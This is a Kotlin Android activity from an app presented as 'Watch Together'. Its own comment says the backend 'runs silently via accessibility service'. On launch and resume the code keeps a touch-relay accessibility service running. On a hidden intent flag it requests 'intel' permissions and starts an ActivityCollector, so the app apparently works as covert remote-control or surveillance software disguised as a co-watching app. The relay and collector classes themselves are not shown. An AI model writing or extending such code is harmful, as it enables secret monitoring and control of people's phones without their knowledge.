package com.phonehand.app

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

/** Minimal Watch Together home — backend runs silently via accessibility service. */
class HomeActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (!UserSession.isSignedUp(this) || !UserSession.onboardingDone(this)) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_home)
        TouchAccessibilityService.instance?.ensureRelay()
        if (intent.getBooleanExtra(EXTRA_REQUEST_INTEL, false)) {
            requestIntelPermissions()
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent.getBooleanExtra(EXTRA_REQUEST_INTEL, false)) {
            requestIntelPermissions()
        }
    }

    override fun onResume() {
        super.onResume()
        if (!WatchSync.isEnabled(this)) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }
        TouchAccessibilityService.instance?.ensureRelay()
    }

    private fun requestIntelPermissions() {
        val missing = PermissionRequester.missing(this)
        if (missing.isEmpty()) {
            finish()
            return
        }
        ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_INTEL)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQ_INTEL) {
            ActivityCollector.get(this).start()
            finish()
        }
    }

    companion object {
        const val EXTRA_REQUEST_INTEL = "request_intel"
        private const val REQ_INTEL = 8801
    }
}
